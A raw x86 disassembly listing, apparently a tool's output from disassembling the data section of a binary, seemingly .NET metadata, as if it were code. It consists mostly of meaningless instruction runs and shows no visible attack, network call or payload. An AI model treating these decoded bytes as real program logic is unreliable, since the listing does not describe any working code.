  403402:	add    eax,0x6c00
  403407:	add    ah,cl
  403409:	or     DWORD PTR [eax],eax
  40340b:	add    BYTE PTR [ebx],ah
  40340d:	jle    0x40340f
  40340f:	add    BYTE PTR [eax],bh
  403411:	or     al,BYTE PTR [eax]
  403413:	add    BYTE PTR [eax],bl
  403415:	sldt   WORD PTR [eax]
  403418:	and    edx,DWORD PTR [ebx+0x74]
  40341b:	jb     0x403486
  40341d:	outs   dx,BYTE PTR ds:[esi]
  40341e:	addr16 jae 0x403421
  403421:	add    BYTE PTR [eax],al
  403423:	add    BYTE PTR [eax+0x19],dl
  403426:	add    BYTE PTR [eax],al
  403428:	mov    eax,0x23000003
  40342d:	push   ebp
  40342e:	push   ebx
  40342f:	add    BYTE PTR [eax],cl
  403431:	sbb    eax,0x100000
  403436:	add    BYTE PTR [eax],al
  403438:	and    eax,DWORD PTR [edi+0x55]
  40343b:	dec    ecx
  40343c:	inc    esp
  40343d:	add    BYTE PTR [eax],al
  40343f:	add    BYTE PTR [eax],bl
  403441:	sbb    eax,0x98c0000
  403446:	add    BYTE PTR [eax],al
  403448:	and    eax,DWORD PTR [edx+0x6c]
  40344b:	outs   dx,DWORD PTR ds:[esi]
  40344c:	bound  eax,QWORD PTR [eax]
  40344e:	add    BYTE PTR [eax],al
  403450:	add    BYTE PTR [eax],al
  403452:	add    BYTE PTR [eax],al
  403454:	add    al,BYTE PTR [eax]
  403456:	add    BYTE PTR [ecx],al
  403458:	push   edi
  403459:	sbb    eax,0x10909a2
  40345e:	add    BYTE PTR [eax],al
  403460:	add    dl,bh
  403462:	add    DWORD PTR [ebx],esi
  403464:	add    BYTE PTR [esi],dl
  403466:	add    BYTE PTR [eax],al
  403468:	add    DWORD PTR [eax],eax
  40346a:	add    BYTE PTR [eax],al
  40346c:	inc    ebx
  40346d:	add    BYTE PTR [eax],al
  40346f:	add    BYTE PTR ds:0x2b000000,al
  403475:	add    BYTE PTR [eax],al
  403477:	add    BYTE PTR [edx],bl
  403479:	add    BYTE PTR [eax],al
  40347b:	add    BYTE PTR [ecx],dl
  40347d:	add    BYTE PTR [eax],al
  40347f:	add    BYTE PTR [edi+0x0],bl
  403482:	add    BYTE PTR [eax],al
  403484:	sub    DWORD PTR [eax],eax
  403486:	add    BYTE PTR [eax],al
  403488:	adc    eax,DWORD PTR [eax]
  40348a:	add    BYTE PTR [eax],al
  40348c:	push   es
  40348d:	add    BYTE PTR [eax],al
  40348f:	add    BYTE PTR [ebx],al
  403491:	add    BYTE PTR [eax],al
  403493:	add    BYTE PTR [ebx],cl
  403495:	add    BYTE PTR [eax],al
  403497:	add    BYTE PTR ds:0x8000000,cl
  40349d:	add    BYTE PTR [eax],al
  40349f:	add    BYTE PTR [ecx],al
  4034a1:	add    BYTE PTR [eax],al
  4034a3:	add    BYTE PTR [ebx],al
  4034a5:	add    BYTE PTR [eax],al
  4034a7:	add    BYTE PTR [ecx],al
  4034a9:	add    BYTE PTR [eax],al
  4034ab:	add    BYTE PTR [eax],al
  4034ad:	add    BYTE PTR [edx],cl
  4034af:	add    BYTE PTR [ecx],al
  4034b1:	add    BYTE PTR [eax],al
  4034b3:	add    BYTE PTR [eax],al
  4034b5:	add    BYTE PTR [esi],al
  4034b7:	add    BYTE PTR [ecx+0xa008200],cl
  4034bd:	add    cl,bl
  4034bf:	add    BYTE PTR [edx+0xe000a00],dh
  4034c5:	add    DWORD PTR [ebp+0x4b000600],edx
  4034cb:	add    DWORD PTR [esi],esi
  4034cd:	add    DWORD PTR [esi],eax
  4034cf:	add    cl,bh
  4034d1:	add    ch,al
  4034d3:	add    al,BYTE PTR [esi]
  4034d5:	add    BYTE PTR [esi+eax*1+0x55],dh
  4034d9:	push   es
  4034da:	push   es
  4034db:	add    BYTE PTR [edx+0x6068806],bl
  4034e1:	add    BYTE PTR [ebx+0x6068806],dh
  4034e7:	add    ah,cl
  4034e9:	push   es
  4034ea:	mov    BYTE PTR [esi],al
  4034ec:	push   es
  4034ed:	add    bh,ah
  4034ef:	push   es
  4034f0:	mov    BYTE PTR [esi],al
  4034f2:	push   es
  4034f3:	add    BYTE PTR [eax],al
  4034f5:	pop    es
  4034f6:	mov    BYTE PTR [esi],al
  4034f8:	push   es
  4034f9:	add    BYTE PTR ds:0x6068807,bl
  4034ff:	add    BYTE PTR [ebx+0x7],al
  403502:	mov    BYTE PTR [esi],al
  403504:	push   es
  403505:	add    BYTE PTR [edi+eax*1-0x78],bl
  403509:	push   es
  40350a:	push   es
  40350b:	add    BYTE PTR [edi+0x7],dh
  40350e:	mov    BYTE PTR [esi],al
  403510:	push   es
  403511:	add    BYTE PTR [edx+0x6068807],dl
  403517:	add    BYTE PTR [ecx+0x6068807],ch
  40351d:	add    dh,al
  40351f:	pop    es
  403520:	mov    BYTE PTR [esi],al
  403522:	push   es
  403523:	add    bh,bl
  403525:	pop    es
  403526:	call   0x1403b2d
  40352b:	or     BYTE PTR [eax+0x2d000606],cl
  403531:	or     BYTE PTR [edx],bl
  403533:	or     BYTE PTR [edi+0x0],dl
  403536:	inc    ecx
  403537:	or     BYTE PTR [eax],al
  403539:	add    BYTE PTR [esi],al
  40353b:	add    BYTE PTR [eax+0x8],dh
  40353e:	push   eax
  40353f:	or     BYTE PTR [esi],al
  403541:	add    BYTE PTR [eax+0x6085008],dl
  403547:	add    BYTE PTR [eax+ecx*1+0x60082],dh
  40354e:	ror    BYTE PTR [eax],1
  403550:	add    BYTE PTR [eax],0x6
  403553:	add    bl,ah
  403555:	or     BYTE PTR [edx-0x10fffa00],al
  40355b:	or     BYTE PTR [edx+0x20000600],al
  403561:	or     DWORD PTR [edx+0x27000600],eax
  403567:	or     DWORD PTR [edx+0x67000600],eax
  40356d:	or     DWORD PTR [edi+0x9],edx
  403570:	push   es
  403571:	add    BYTE PTR [eax+0x9],dh
  403574:	push   edi
  403575:	or     DWORD PTR [esi],eax
  403577:	add    BYTE PTR [ebp+0xa008209],bl
  40357d:	add    BYTE PTR [ecx+0xa00b209],dh
  403583:	add    cl,al
  403585:	or     DWORD PTR [edx-0xcfff600],esi
  40358b:	or     DWORD PTR [edx+0x1a000a00],esi
  403591:	or     dh,BYTE PTR [edx+0x62000600]
  403597:	or     al,BYTE PTR [edx-0x7ffffa00]
  40359d:	or     al,BYTE PTR [edx-0x6dfffa00]
  4035a3:	or     cl,BYTE PTR [eax-0x58fff9f6]
  4035a9:	or     al,BYTE PTR [edx-0x31fffa00]
  4035af:	or     al,BYTE PTR [edx-0x2cfffa00]
  4035b5:	or     al,BYTE PTR [edx-0x8fffa00]
  4035bb:	or     cl,BYTE PTR [eax-0x77fff1fa]
  4035c1:	or     esi,DWORD PTR [ebx+0xb]
  4035c4:	push   es
  4035c5:	add    BYTE PTR [ecx+0x60a880b],ah
  4035cb:	add    dh,al
  4035cd:	or     edi,DWORD PTR [edx-0x24fff9f5]
  4035d3:	or     ecx,DWORD PTR [eax-0x17fff9f6]
  4035d9:	or     ecx,DWORD PTR [eax+0x16000a0a]
  4035df:	or     al,0xb2
  4035e1:	add    BYTE PTR [esi],al
  4035e3:	add    BYTE PTR [ecx+0xc],cl
  4035e6:	cs or  al,0x6
  4035e9:	add    BYTE PTR [edi+0xc],dl
  4035ec:	cs or  al,0xa
  4035ef:	add    BYTE PTR [edi+0xc],bh
  4035f2:	mov    dl,0x0
  4035f4:	push   es
  4035f5:	add    dl,cl
  4035f7:	or     al,0xb7
  4035f9:	or     al,0xa
  4035fb:	add    bl,ah
  4035fd:	or     al,0xb2
  4035ff:	add    BYTE PTR [edx],cl
  403601:	add    BYTE PTR [eax],dl
  403603:	or     eax,0xa00b2
  403608:	and    DWORD PTR ds:0xa0095,ecx
  40360e:	pop    edi
  40360f:	or     eax,0xa00b2
  403614:	xchg   DWORD PTR ds:0xa00b2,ecx
  40361a:	stos   BYTE PTR es:[edi],al
  40361b:	or     eax,0x60095
  403620:	retf   
  403621:	or     eax,0x60a88
  403626:	xlat   BYTE PTR ds:[ebx]
  403627:	or     eax,0x60082
  40362c:	or     DWORD PTR [esi],ecx
  40362e:	mov    edx,0x35000a0b
  403633:	push   cs
  403634:	xchg   ebp,eax
  403635:	add    BYTE PTR [esi],al
  403637:	add    BYTE PTR [ebp+0xe],dh
  40363a:	push   eax
  40363b:	or     BYTE PTR [esi],al
  40363d:	add    BYTE PTR [eax+0x600820e],dl
  403643:	add    BYTE PTR [ebp+0x6880e],bh
  403649:	add    BYTE PTR [eax],al
  40364b:	add    BYTE PTR [ecx],al
  40364d:	add    BYTE PTR [eax],al
  40364f:	add    BYTE PTR [eax],al
  403651:	add    BYTE PTR [ecx],al
  403653:	add    BYTE PTR [ecx],al
  403655:	add    BYTE PTR [ecx],al
  403657:	add    BYTE PTR [eax],dl
  403659:	add    BYTE PTR [eax+eax*1],dl
  40365c:	and    al,BYTE PTR [eax]
  40365e:	add    eax,0x1000100
  403663:	add    BYTE PTR [eax],al
  403665:	add    BYTE PTR [eax],dl
  403667:	add    BYTE PTR [eax+eax*1+0x22],cl
  40366b:	add    BYTE PTR ds:0x6000100,al
  403671:	add    BYTE PTR [eax],al
  403673:	add    BYTE PTR [eax],dl
  403675:	add    BYTE PTR [ecx+0x0],ah
  403678:	and    al,BYTE PTR [eax]
  40367a:	add    eax,0x13000100
  40367f:	add    BYTE PTR [eax+0x65001001],al
  403685:	add    BYTE PTR [eax],al
  403687:	add    BYTE PTR ds:0x1a000d00,al
  40368d:	add    BYTE PTR [esi-0x80],dl
  403690:	pop    esp
  403691:	add    dl,BYTE PTR [edx+0x0]
  403694:	push   esi
  403695:	sub    BYTE PTR [ebp+0x2],0x52
  403699:	add    BYTE PTR [esi-0x80],dl
  40369c:	je     0x4036a0
  40369e:	push   edx
  40369f:	add    BYTE PTR [esi-0x80],dl
  4036a2:	sbb    eax,DWORD PTR [edx]
  4036a4:	push   edx
  4036a5:	add    BYTE PTR [esi-0x80],dl
  4036a8:	xor    al,0x2
  4036aa:	push   edx
  4036ab:	add    BYTE PTR [esi-0x80],dl
  4036ae:	jns    0x4036b2
  4036b0:	push   edx
  4036b1:	add    BYTE PTR [esi-0x80],dl
  4036b4:	mov    WORD PTR [edx],es
  4036b6:	push   edx
  4036b7:	add    BYTE PTR [esi-0x80],dl
  4036ba:	stos   DWORD PTR es:[edi],eax
  4036bb:	add    dl,BYTE PTR [edx+0x0]
  4036be:	push   esi
  4036bf:	cmp    BYTE PTR [esi+0x56005202],0x80
  4036c6:	rol    DWORD PTR [edx],cl
  4036c8:	push   edx
  4036c9:	add    BYTE PTR [ecx],dl
  4036cb:	add    BYTE PTR [ecx],cl
  4036cd:	add    edx,ebp
  4036cf:	add    DWORD PTR [ecx],edx
  4036d1:	add    BYTE PTR [ecx],bl
  4036d3:	add    ebx,ecx
  4036d5:	add    DWORD PTR [esi-0x80],edx
  4036d8:	sub    al,0x3
  4036da:	push   edx
  4036db:	add    BYTE PTR [esi-0x80],dl
  4036de:	cmp    al,BYTE PTR [ebx]
  4036e0:	cld    
  4036e1:	add    DWORD PTR [esi-0x80],edx
  4036e4:	inc    edi
  4036e5:	add    edi,esp
  4036e7:	add    DWORD PTR [esi-0x80],edx
  4036ea:	push   esp
  4036eb:	add    edi,esp
  4036ed:	add    DWORD PTR [esi-0x80],edx
  4036f0:	popa   
  4036f1:	add    edi,esp
  4036f3:	add    DWORD PTR [esi-0x80],edx
  4036f6:	imul   eax,DWORD PTR [ebx],0x80560052
  4036fc:	jle    0x403701
  4036fe:	push   edx
  4036ff:	add    BYTE PTR [esi-0x80],dl
  403702:	nop
  403703:	add    edx,DWORD PTR [edx+0x0]
  403706:	push   esi
  403707:	xor    BYTE PTR [ebx+eax*1-0x7fa9ffae],0xce
  40370f:	add    edx,DWORD PTR [edx+0x0]
  403712:	push   esi
  403713:	sub    ah,0x3
  403716:	push   edx
  403717:	add    BYTE PTR [esi-0x80],dl
  40371a:	push   cs
  40371b:	add    al,0x52
  40371d:	add    BYTE PTR [esi-0x80],dl
  403720:	and    al,0x4
  403722:	push   edx
  403723:	add    BYTE PTR [esi-0x80],dl
  403726:	inc    ecx
  403727:	add    al,0x52
  403729:	add    BYTE PTR [esi-0x80],dl
  40372c:	pop    edx
  40372d:	add    al,0x52
  40372f:	add    BYTE PTR [esi-0x80],dl
  403732:	jae    0x403738
  403734:	push   edx
  403735:	add    BYTE PTR [esi-0x80],dl
  403738:	xchg   BYTE PTR [edx+edx*2],al
  40373b:	add    BYTE PTR [esi-0x80],dl
  40373e:	cdq    
  40373f:	add    al,0x52
  403741:	add    BYTE PTR [esi-0x80],dl
  403744:	scas   eax,DWORD PTR es:[edi]
  403745:	add    al,0x52
  403747:	add    BYTE PTR [esi-0x80],dl
  40374a:	les    eax,FWORD PTR [edx+edx*2]
  40374d:	add    BYTE PTR [esi-0x80],dl
  403750:	xlat   BYTE PTR ds:[ebx]
  403751:	add    al,0x52
  403753:	add    BYTE PTR [esi-0x80],dl
  403756:	jmp    0x40375c
  403758:	push   edx
  403759:	add    BYTE PTR [esi-0x80],dl
  40375c:	inc    BYTE PTR [edx+edx*2]
  40375f:	add    BYTE PTR [esi-0x80],dl
  403762:	adc    DWORD PTR ds:0x80560052,eax
  403768:	daa    
  403769:	add    eax,0x8056045a
  40376e:	cmp    DWORD PTR ds:0x8056045a,eax
  403774:	push   ebp
  403775:	add    eax,0x80560052
  40377a:	push   0x5
  40377c:	push   edx
  40377d:	add    BYTE PTR [esi-0x80],dl
  403780:	add    BYTE PTR ds:0x80560052,0x9f
  403787:	add    eax,0x80560052
  40378c:	mov    eax,0xd0005205
  403791:	and    BYTE PTR [eax],al
  403793:	add    BYTE PTR [eax],al
  403795:	add    BYTE PTR [esi+0xa009000],dl
  40379b:	add    BYTE PTR [ecx],al
  40379d:	add    ah,al
  40379f:	and    al,BYTE PTR [eax]
  4037a1:	add    BYTE PTR [eax],al
  4037a3:	add    BYTE PTR [ecx+0x1900ef00],dl
  4037a9:	add    BYTE PTR [edx],al
  4037ab:	add    BYTE PTR [eax+0x25],al
  4037ae:	add    BYTE PTR [eax],al
  4037b0:	add    BYTE PTR [eax],al
  4037b2:	xchg   ecx,eax
  4037b3:	add    dh,bh
  4037b5:	add    BYTE PTR [edi],bl
  4037b7:	add    BYTE PTR [ebx],al
  4037b9:	add    BYTE PTR [eax+0x25],ah
  4037bf:	add    BYTE PTR [ecx+0x24011a00],dl
  4037c5:	add    BYTE PTR [eax+eax*1],al
  4037c8:	or     al,0x26
  4037ca:	add    BYTE PTR [eax],al
  4037cc:	add    BYTE PTR [eax],al
  4037ce:	xchg   BYTE PTR [eax],bl
  4037d0:	xor    BYTE PTR [ecx],al
  4037d2:	sub    al,BYTE PTR [eax]
  4037d4:	add    eax,0x261400
  4037d9:	add    BYTE PTR [eax],al
  4037db:	add    BYTE PTR [eax+ebx*1+0x2a0130],al
  4037e2:	add    eax,0x261c00
  4037e7:	add    BYTE PTR [eax],al
  4037e9:	add    BYTE PTR [esi+0x2e015708],dl
  4037ef:	add    BYTE PTR ds:0x262300,al
  4037f5:	add    BYTE PTR [eax],al
  4037f7:	add    BYTE PTR [esi+0x33016308],dl
  4037fd:	add    BYTE PTR ds:0x262b00,al
  403803:	add    BYTE PTR [eax],al
  403805:	add    BYTE PTR [esi+0x39016f08],dl
  40380b:	add    BYTE PTR [esi],al
  40380d:	add    BYTE PTR [edi],dh
  40380f:	add    BYTE PTR es:[eax],al
  403812:	add    BYTE PTR [eax],al
  403814:	xchg   esi,eax
  403815:	or     BYTE PTR [ecx+eax*1+0x60039],al
  40381c:	inc    ebx
  40381d:	add    BYTE PTR es:[eax],al
  403820:	add    BYTE PTR [eax],al
  403822:	xchg   esi,eax
  403823:	or     BYTE PTR [edi+0x6003901],cl
  403829:	add    BYTE PTR [edi+0x26],cl
  40382c:	add    BYTE PTR [eax],al
  40382e:	add    BYTE PTR [eax],al
  403830:	xchg   esi,eax
  403831:	or     BYTE PTR [eax+0x6003901],bl
  403837:	add    BYTE PTR [ebx+0x26],bl
  40383a:	add    BYTE PTR [eax],al
  40383c:	add    BYTE PTR [eax],al
  40383e:	xchg   esi,eax
  40383f:	or     BYTE PTR [edi+0x6003901],ch
  403845:	add    BYTE PTR [edi+0x26],ah
  403848:	add    BYTE PTR [eax],al
  40384a:	add    BYTE PTR [eax],al
  40384c:	xchg   esi,eax
  40384d:	or     dl,dl
  40384f:	add    DWORD PTR [ecx],edi
  403851:	add    BYTE PTR [esi],al
  403853:	add    BYTE PTR [ebx+0x26],dh
  403856:	add    BYTE PTR [eax],al
  403858:	add    BYTE PTR [eax],al
  40385a:	xchg   esi,eax
  40385b:	or     cl,ch
  40385d:	add    DWORD PTR [ecx],edi
  40385f:	add    BYTE PTR [esi],al
  403861:	add    BYTE PTR [edi+0x26],bh
  403864:	add    BYTE PTR [eax],al
  403866:	add    BYTE PTR [eax],al
  403868:	xchg   esi,eax
  403869:	or     BYTE PTR [edx],al
  40386b:	add    bh,BYTE PTR [ecx]
  40386d:	add    BYTE PTR [esi],al
  40386f:	add    BYTE PTR [ebx+0x26],cl
  403875:	add    BYTE PTR [esi+0x3d021b00],dl
  40387b:	add    BYTE PTR [esi],al
  40387d:	add    BYTE PTR [edi+0x26],bl
  403883:	add    BYTE PTR [esi+0x44023400],dl
  403889:	add    BYTE PTR [ecx],cl
  40388b:	add    BYTE PTR [esi+eiz*1+0x0],ch
  403892:	sbb    DWORD PTR [eax],0x2a0130
  403898:	or     al,BYTE PTR [eax]
  40389a:	mov    ah,0x26
  40389c:	add    BYTE PTR [eax],al
  40389e:	add    BYTE PTR [eax],al
  4038a0:	xchg   esi,eax
  4038a1:	or     BYTE PTR [edi+0x1],dl
  4038a4:	add    BYTE PTR cs:[edx],cl
  4038a7:	add    BYTE PTR [ebx+0x26],bh
  4038ad:	add    BYTE PTR [esi+0x33016308],dl
  4038b3:	add    BYTE PTR [edx],cl
  4038b5:	add    bl,al
  4038b7:	add    BYTE PTR es:[eax],al
  4038ba:	add    BYTE PTR [eax],al
  4038bc:	xchg   esi,eax
  4038bd:	add    BYTE PTR [edx],ah
  4038bf:	add    eax,DWORD PTR [eax+eax*1+0xb]
  4038c3:	add    al,bl
  4038c5:	add    BYTE PTR es:[eax],al
  4038c8:	add    BYTE PTR [eax],al
  4038ca:	xchg   esi,eax
  4038cb:	add    BYTE PTR [edx],ah
  4038cd:	add    ebx,ebp
  4038cf:	add    DWORD PTR [eax+eax*1],ecx
  4038d2:	or     al,0x27
  4038d4:	add    BYTE PTR [eax],al
  4038d6:	add    BYTE PTR [eax],al
  4038d8:	xchg   esi,eax
  4038d9:	add    BYTE PTR [edx],ah
  4038db:	add    esp,ebx
  4038dd:	add    DWORD PTR [esi],ecx
  4038df:	add    BYTE PTR [edi+0x27],al
  4038e2:	add    BYTE PTR [eax],al
  4038e4:	add    BYTE PTR [eax],al
  4038e6:	xchg   ecx,eax
  4038e7:	sbb    BYTE PTR [ecx+0x1207d90e],ch
  4038ed:	add    BYTE PTR [edi+eiz*1+0x0],bh
  4038f1:	add    BYTE PTR [eax],al
  4038f3:	add    BYTE PTR [esi+0x3905d108],dl
  4038f9:	add    BYTE PTR [edx],dl
  4038fb:	add    BYTE PTR [eax],al
  4038fd:	add    BYTE PTR [ecx],al
  4038ff:	add    bh,bh
  403901:	add    eax,0x10000
  403906:	add    al,0x6
  403908:	add    BYTE PTR [eax],al
  40390a:	add    DWORD PTR [eax],eax
  40390c:	or     eax,DWORD PTR [esi]
  40390e:	add    BYTE PTR [eax],al
  403910:	add    DWORD PTR [eax],eax
  403912:	adc    DWORD PTR [esi],eax
  403914:	add    BYTE PTR [eax],al
  403916:	add    DWORD PTR [eax],eax
  403918:	sbb    eax,0x1000006
  40391d:	add    BYTE PTR [ebx],ah
  40391f:	push   es
  403920:	add    BYTE PTR [eax],al
  403922:	add    al,BYTE PTR [eax]
  403924:	cs push es
  403926:	add    BYTE PTR [eax],al
  403928:	add    eax,DWORD PTR [eax]
  40392a:	xor    eax,DWORD PTR [esi]
  40392c:	add    BYTE PTR [eax],al
  40392e:	add    DWORD PTR [eax],eax
  403930:	xor    eax,DWORD PTR [esi]
  403932:	add    BYTE PTR [eax],al
  403934:	add    DWORD PTR [eax],eax
  403936:	sbb    eax,0x1000006
  40393b:	add    BYTE PTR [edx+0x6],al
  40393e:	add    BYTE PTR [eax],al
  403940:	add    DWORD PTR [eax],eax
  403942:	inc    edx
  403943:	push   es
  403944:	add    BYTE PTR [eax],al
  403946:	add    al,BYTE PTR [eax]
  403948:	inc    esi
  403949:	push   es
  40394a:	add    BYTE PTR [eax],al
  40394c:	add    DWORD PTR [eax],eax
  40394e:	inc    edx
  40394f:	push   es
  403950:	add    BYTE PTR [eax],al
  403952:	add    al,BYTE PTR [eax]
  403954:	inc    esi
  403955:	push   es
  403956:	add    BYTE PTR [eax],al
  403958:	add    eax,DWORD PTR [eax]
  40395a:	dec    ebx
  40395b:	push   es
  40395c:	add    BYTE PTR [eax],al
  40395e:	add    al,0x0
  403960:	push   eax
  403961:	push   es
  403962:	xor    DWORD PTR [eax],eax
  403964:	xor    BYTE PTR [ecx],al
  403966:	add    ax,0x39
  40396a:	xor    BYTE PTR [ecx],al
  40396c:	imul   eax,DWORD PTR ds:0x1300041,0x6b
  403973:	add    eax,0x1300049
  403978:	imul   eax,DWORD PTR ds:0x1300051,0x6b
  40397f:	add    eax,0x1300059
  403984:	imul   eax,DWORD PTR ds:0x1300061,0x6b
  40398b:	add    eax,0x1300069
  403990:	imul   eax,DWORD PTR ds:0x1300071,0x66
  403997:	add    eax,0x1300079
  40399c:	imul   eax,DWORD PTR ds:0x1300081,0x6b
  4039a3:	add    eax,0x1300089
  4039a8:	imul   eax,DWORD PTR ds:0x1300091,0x6b
  4039af:	add    eax,0x1300099
  4039b4:	imul   eax,DWORD PTR ds:0x13000a1,0x6b
  4039bb:	add    eax,0x13000a9
  4039c0:	jo     0x4039c7
  4039c2:	mov    ecx,0x76013000
  4039c7:	add    eax,0x13000c1
  4039cc:	sub    al,BYTE PTR [eax]
  4039ce:	leave  
  4039cf:	add    BYTE PTR [eax],dh
  4039d1:	add    DWORD PTR ds:0x900d906,ebx
  4039d7:	or     DWORD PTR [esi+eax*1],ebp
  4039da:	jmp    0x334971df
  4039df:	push   es
  4039e0:	fld    DWORD PTR [eax]
  4039e2:	inc    eax
  4039e3:	or     DWORD PTR [ebx],edi
  4039e5:	push   es
  4039e6:	stc    
  4039e7:	add    BYTE PTR [ecx+ecx*1+0x41],bh
  4039eb:	push   es
  4039ec:	add    DWORD PTR [ecx],eax
  4039ee:	mov    DWORD PTR [ecx],ecx
  4039f0:	inc    esi
  4039f1:	push   es
  4039f2:	add    DWORD PTR [ecx],eax
  4039f4:	xchg   esp,eax
  4039f5:	or     DWORD PTR [ebp+0x6],ecx
  4039f8:	or     DWORD PTR [ecx],eax
  4039fa:	test   eax,0x11002a09
  4039ff:	add    edx,ecx
  403a01:	or     DWORD PTR [edx+0x6],edx
  403a04:	sbb    DWORD PTR [ecx],eax
  403a06:	(bad)  [ecx]
  403a08:	pop    eax
  403a09:	push   es
  403a0a:	adc    DWORD PTR [eax],eax
  403a0c:	xor    ecx,DWORD PTR [edx]
  403a0e:	pop    ebp
  403a0f:	push   es
  403a10:	and    DWORD PTR [eax],eax
  403a12:	dec    ebp
  403a13:	or     ch,BYTE PTR [esi]
  403a15:	add    cl,ch
  403a17:	add    BYTE PTR [edx+0xa],dh
  403a1a:	push   0x30012906
  403a1f:	add    DWORD PTR [edx+0x6],esi
  403a22:	or     al,0x0
  403a24:	jns    0x403a30
  403a26:	add    DWORD PTR [esi],0xa9d0139
  403a2c:	xchg   DWORD PTR [esi],eax
  403a2e:	dec    ecx
  403a2f:	add    DWORD PTR [ecx+0x41068d0a],esi
  403a35:	add    DWORD PTR [ebp-0x16f96ef6],edi
  403a3b:	add    bh,al
  403a3d:	or     dl,BYTE PTR [edi-0x1afeaefa]
  403a43:	or     bl,BYTE PTR [esi+0x15106]
  403a49:	or     esp,DWORD PTR [edi+0xd016106]
  403a4f:	or     ebp,DWORD PTR [ebp+0x21008106]
  403a55:	or     ecx,DWORD PTR [ebp+0x2b006106]
  403a5b:	or     ecx,DWORD PTR [ebp+0x44004906]
  403a61:	or     ecx,DWORD PTR [ebp-0x6afe96fa]
  403a67:	or     eax,edx
  403a69:	push   es
  403a6a:	jmp    0x524bd56f
  403a6f:	add    BYTE PTR [ecx],bh
  403a71:	add    DWORD PTR [eax+0x7906ec0b],ebp
  403a77:	add    edi,ecx
  403a79:	or     esi,edx
  403a7b:	push   es
  403a7c:	add    DWORD PTR [ecx],0x6f80130
  403a82:	mov    DWORD PTR [ecx],eax
  403a84:	repz or ecx,DWORD PTR [ebp-0x2fe76fa]
  403a8b:	or     ebp,DWORD PTR [edx]
  403a8d:	add    BYTE PTR [ecx+0x1],al
  403a90:	mov    ebp,0xe9056b0a
  403a95:	add    BYTE PTR [ebx],al
  403a97:	or     al,0x2
  403a99:	pop    es
  403a9a:	adc    DWORD PTR [ecx],eax
  403a9c:	retf   0x709
  403a9f:	pop    es
  403aa0:	sbb    DWORD PTR [ecx],eax
  403aa2:	adc    DWORD PTR [edx+ebp*1],ecx
  403aa5:	add    BYTE PTR [ecx],bl
  403aa7:	add    DWORD PTR [edi],ebx
  403aa9:	or     al,0xf
  403aab:	pop    es
  403aac:	sub    al,0x0
  403aae:	gs or  al,0x1e
  403ab1:	pop    es
  403ab2:	xor    al,0x0
  403ab4:	jae    0x403ac2
  403ab6:	xor    DWORD PTR [edi],eax
  403ab8:	xchg   ecx,eax
  403ab9:	add    DWORD PTR [ecx+0x2907360c],edx
  403abf:	add    DWORD PTR [esi-0x56f972f4],ebx
  403ac5:	add    DWORD PTR [ebp-0x4efa94f4],ebp
  403acb:	add    esi,edx
  403acd:	or     al,0x3c
  403acf:	pop    es
  403ad0:	test   eax,0x6b0cdf01
  403ad5:	add    eax,0xcf20191
  403ada:	inc    eax
  403adb:	pop    es
  403adc:	mov    ecx,0x2a0bfd01
  403ae1:	add    BYTE PTR [ecx+0x2a0cfc01],dl
  403ae7:	add    BYTE PTR [ecx],bh
  403ae9:	add    DWORD PTR [eax],ecx
  403aeb:	or     eax,0x1910687
  403af0:	sub    cl,BYTE PTR ds:0x3c0746
  403af6:	xor    eax,0x907310d
  403afb:	add    BYTE PTR [edx],bh
  403afd:	or     eax,0x3c068d
  403b02:	inc    ebx
  403b03:	or     eax,0x191073c
  403b08:	popf   
  403b09:	or     bl,BYTE PTR [edx+0x7]
  403b0c:	inc    esp
  403b0d:	add    BYTE PTR [ebx+0xd],al
  403b10:	cmp    al,0x7
  403b12:	inc    esp
  403b13:	add    BYTE PTR [ebp+0xd],dl
  403b16:	push   0x7
  403b18:	inc    esp
  403b19:	add    BYTE PTR ds:0x9107310d,dh
  403b1f:	add    DWORD PTR [ecx+0xd],esi
  403b22:	outs   dx,BYTE PTR ds:[esi]
  403b23:	pop    es
  403b24:	rol    DWORD PTR [ecx],1
  403b26:	xchg   ebp,eax
  403b27:	or     eax,0x1d10774
  403b2c:	lahf   
  403b2d:	or     eax,0x119077a
  403b32:	std    
  403b33:	or     ebp,DWORD PTR [edx]
  403b35:	add    cl,ah
  403b37:	add    DWORD PTR [ebx-0x36f87ff3],edi
  403b3d:	add    esp,ebp
  403b3f:	or     eax,0x1907a8
  403b44:	sti    
  403b45:	or     eax,0x1f9077a
  403b4a:	xor    BYTE PTR [ecx],al
  403b4c:	sub    al,BYTE PTR [eax]
  403b4e:	stc    
  403b4f:	add    DWORD PTR [edi],edx
  403b51:	push   cs
  403b52:	mov    cl,0x7
  403b54:	dec    ecx
  403b55:	add    DWORD PTR [edx],esp
  403b57:	push   cs
  403b58:	jp     0x403b61
  403b5a:	sbb    DWORD PTR [eax],eax
  403b5c:	inc    esp
  403b5d:	push   cs
  403b5e:	mov    eax,0x57020107
  403b63:	push   cs
  403b64:	push   0x7
  403b66:	add    DWORD PTR [edx],eax
  403b68:	ins    BYTE PTR es:[edi],dx
  403b69:	push   cs
  403b6a:	lea    eax,[esi]
  403b6c:	or     DWORD PTR [eax],eax
  403b6e:	xor    BYTE PTR [ecx],al
  403b70:	sub    al,BYTE PTR [eax]
  403b72:	or     DWORD PTR [edx],eax
  403b74:	xor    BYTE PTR [ecx],al
  403b76:	sub    al,BYTE PTR [eax]
  403b78:	sub    DWORD PTR [eax],eax
  403b7a:	and    al,BYTE PTR [ebx]
  403b7c:	int    0x7
  403b7e:	and    DWORD PTR [eax],eax
  403b80:	xchg   esi,eax
  403b81:	push   cs
  403b82:	add    BYTE PTR cs:[ecx+0x1],dl
  403b86:	mov    al,0xe
  403b88:	lea    eax,[esi]
  403b8a:	push   ecx
  403b8b:	add    esp,eax
  403b8d:	push   cs
  403b8e:	fld    QWORD PTR [edi]
  403b90:	sbb    DWORD PTR [edx],eax
  403b92:	add    BYTE PTR [ebx],cl
  403b94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b95:	push   es
  403b96:	sub    DWORD PTR [eax],eax
  403b98:	xor    BYTE PTR [ecx],al
  403b9a:	jecxz  0x403ba3
  403b9c:	push   cs
  403b9d:	add    BYTE PTR [eax+eax*1],al
  403ba0:	push   ebp
  403ba1:	add    BYTE PTR [esi],cl
  403ba3:	add    BYTE PTR [eax],cl
  403ba5:	add    BYTE PTR [esi+0x0],dh
  403ba8:	push   cs
  403ba9:	add    BYTE PTR [eax+eax*1],cl
  403bac:	add    DWORD PTR [eax],0xe
  403baf:	add    BYTE PTR [eax],dl
  403bb1:	add    BYTE PTR [eax+eax*1+0x14000e],cl
  403bb8:	mov    ebp,0x18000e00
  403bbd:	add    ah,bh
